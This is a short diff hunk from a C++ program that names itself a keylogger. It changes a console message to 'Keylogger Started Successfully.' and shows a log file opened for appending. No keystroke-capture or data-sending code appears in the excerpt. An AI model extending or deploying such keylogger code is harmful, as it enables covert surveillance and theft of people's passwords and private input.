@@ -598,7 +598,7 @@ int main()
 
   fstream FStream;
 
-  cout << "now keyloggers";
+  cout << "Keylogger Started Successfully.";
 
   FStream.open(Filename.c_str(), std::fstream::out | std::fstream::app);
 
